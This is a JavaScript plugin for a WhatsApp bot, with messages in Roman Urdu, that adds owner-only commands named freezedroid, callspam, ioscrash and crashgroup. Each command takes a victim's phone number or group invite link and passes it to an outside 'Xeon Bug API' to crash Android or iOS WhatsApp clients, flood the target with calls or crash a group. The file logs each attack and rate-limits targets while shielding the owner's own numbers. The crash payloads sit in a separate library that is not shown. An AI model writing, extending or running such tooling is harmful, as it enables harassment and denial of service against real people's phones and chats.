// plugins/xeon.js — self-contained (no guard dependency)
const { cmd } = require('../arslan');
const xeon = require('../lib/xeon');

// ═══════════════════════════════════════════
//  INLINE PROTECTION (no external guard file needed)
// ═══════════════════════════════════════════
const fs = require('fs');
const path = require('path');

let userConfig = {};
try { userConfig = require('../config'); } catch (_) {}

function cleanNum(v) {
    if (!v) return '';
    let r = String(v).trim();
    if (r.includes('@')) r = r.split('@')[0];
    if (r.includes(':')) r = r.split(':')[0];
    return r.replace(/[^0-9]/g, '');
}

const OWNERS = [
    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
    userConfig.OWNER_NUMBER
].map(cleanNum).filter(Boolean);

const STATE_FILE = path.join(__dirname, '..', 'xeon_state.json');
const DEFAULTS = {
    protected: OWNERS,
    cooldownHours: 72,
    dailyLimit: 1,
    history: [],
    lastAt: 0
};

function loadState() {
    if (!fs.existsSync(STATE_FILE)) {
        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
        return { ...DEFAULTS };
    }
    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
    catch (_) { return { ...DEFAULTS }; }
}
function saveState(s) {
    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
}
function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }
function minsSince(ts) { return (Date.now() - ts) / 60000; }

function checkTarget(target, botNum) {
    const s = loadState();
    if (target === botNum || (botNum && target.endsWith(botNum))) {
        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
    }
    if (s.protected.includes(target)) {
        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
    }
    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
    if (last && hoursSince(last.ts) < s.cooldownHours) {
        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
    }
    if (s.lastAt && minsSince(s.lastAt) < 60) {
        const r = (60 - minsSince(s.lastAt)).toFixed(1);
        return { ok: false, reason: 'GLOBAL_COOLDOWN', msg: `⏳ Global cooldown. ${r} min.` };
    }
    const today = new Date().toISOString().slice(0, 10);
    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
    if (t >= s.dailyLimit) {
        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
    }
    return { ok: true };
}

function recordAttack(target, status) {
    const s = loadState();
    s.history.push({ target, ts: new Date().toISOString(), status });
    if (status === 'success') s.lastAt = Date.now();
    if (s.history.length > 500) s.history = s.history.slice(-500);
    saveState(s);
}

function botNumFrom(conn) {
    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
}

function parseTarget(args, allowGroup = false) {
    if (!args[0]) return { ok: false };
    if (allowGroup) {
        const m = String(args[0]).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
        if (m) return { ok: true, type: 'group', value: args[0], code: m[1] };
    }
    const n = String(args[0]).replace(/[^0-9]/g, '');
    if (n && n.length >= 10) return { ok: true, type: 'number', value: n };
    return { ok: false };
}

// ═══════════════════════════════════════════
//  .freezedroid
// ═══════════════════════════════════════════
cmd({
    pattern: 'freezedroid',
    alias: ['fd', 'androcrash', 'xeonfd'],
    desc: 'Xeon API — Android WhatsApp crash',
    category: 'owner',
    react: '🤖',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');
        const t = parseTarget(args);
        if (!t.ok) return reply(
`📌 *Usage:* .freezedroid 923xxxxxxxxx

📖 *Example:* .freezedroid 923001234567

🤖 Xeon Bug API — Android crash`
        );

        const check = checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(`🤖 *FREEZEDROID*\n🎯 \`${t.value}\`\n📡 Contacting API...`);

        const res = await xeon.freezeDroid(t.value);

        if (res.ok) {
            recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '🤖', key: mek.key } });
            return reply(
`✅ *SENT*
🎯 \`${t.value}\`
📡 ${res.status}
📦 ${JSON.stringify(res.data).slice(0, 200)}`
            );
        }
        recordAttack(t.value, 'failed:' + res.error);
        return reply(`⚠️ *Xeon API Error*\n\n${res.status} — ${res.error}`);
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .callspam
// ═══════════════════════════════════════════
cmd({
    pattern: 'callspam',
    alias: ['cs', 'callbomb', 'xeoncs'],
    desc: 'Xeon API — call flood',
    category: 'owner',
    react: '📞',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');
        const t = parseTarget(args);
        if (!t.ok) return reply('📌 Usage: `.callspam 923xxxxxxxxx`');

        const check = checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(`📞 *CALLSPAM*\n🎯 \`${t.value}\`\n📡 Contacting API...`);

        const res = await xeon.callSpam(t.value);

        if (res.ok) {
            recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '📞', key: mek.key } });
            return reply(`✅ *SENT*\n🎯 \`${t.value}\`\n📡 ${res.status}\n📦 ${JSON.stringify(res.data).slice(0, 200)}`);
        }
        recordAttack(t.value, 'failed:' + res.error);
        return reply(`⚠️ *Xeon API Error*\n\n${res.status} — ${res.error}`);
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .ioscrash
// ═══════════════════════════════════════════
cmd({
    pattern: 'ioscrash',
    alias: ['iosc', 'icrash', 'xeonios'],
    desc: 'Xeon API — iOS crash',
    category: 'owner',
    react: '🍎',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');
        const t = parseTarget(args);
        if (!t.ok) return reply('📌 Usage: `.ioscrash 923xxxxxxxxx`');

        const check = checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(`🍎 *IOSCRASH*\n🎯 \`${t.value}\`\n📡 Contacting API...`);

        const res = await xeon.iosCrash(t.value);

        if (res.ok) {
            recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '🍎', key: mek.key } });
            return reply(`✅ *SENT*\n🎯 \`${t.value}\`\n📡 ${res.status}\n📦 ${JSON.stringify(res.data).slice(0, 200)}`);
        }
        recordAttack(t.value, 'failed:' + res.error);
        return reply(`⚠️ *Xeon API Error*\n\n${res.status} — ${res.error}`);
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .crashgroup
// ═══════════════════════════════════════════
cmd({
    pattern: 'crashgroup',
    alias: ['cg', 'grpcrash', 'xeongroup'],
    desc: 'Xeon API — group crash',
    category: 'owner',
    react: '💣',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');
        const t = parseTarget(args, true);
        if (!t.ok || t.type !== 'group') return reply(
`📌 *Usage:* .crashgroup <grouplink>

📖 *Example:*
.crashgroup https://chat.whatsapp.com/ABC123`
        );

        let jid = t.code;
        try {
            const md = await conn.groupGetInviteInfo(t.code);
            jid = md.id;
        } catch (_) {}

        const check = checkTarget(jid, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.code}\`\n📋 ${check.reason}`);

        await reply(`💣 *CRASHGROUP*\n🔗 \`${t.code}\`\n📡 Contacting API...`);

        const res = await xeon.crashGroup(t.value);

        if (res.ok) {
            recordAttack(jid, 'success');
            await conn.sendMessage(from, { react: { text: '💣', key: mek.key } });
            return reply(`✅ *SENT*\n🔗 \`${t.code}\`\n📡 ${res.status}\n📦 ${JSON.stringify(res.data).slice(0, 200)}`);
        }
        recordAttack(jid, 'failed:' + res.error);
        return reply(`⚠️ *Xeon API Error*\n\n${res.status} — ${res.error}`);
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .xeon — health + info
// ═══════════════════════════════════════════
cmd({
    pattern: 'xeon',
    alias: ['xeoninfo', 'xeonapi'],
    desc: 'Xeon API health check',
    category: 'owner',
    react: '📡',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { reply, isCreator }) => {
    if (!isCreator) return reply('🔒 Owner only.');
    const h = await xeon.checkApiHealth();
    return reply(
`📡 *XEON BUG API*

🔗 \`${xeon.CONFIG.BASE_URL}\`
💚 ${h.ok ? '✅ ONLINE' : '⚠️ OFFLINE: ' + h.error}

*Commands:*
• \`.freezedroid 923xxx\`
• \`.callspam 923xxx\`
• \`.ioscrash 923xxx\`
• \`.crashgroup <link>\``
    );
});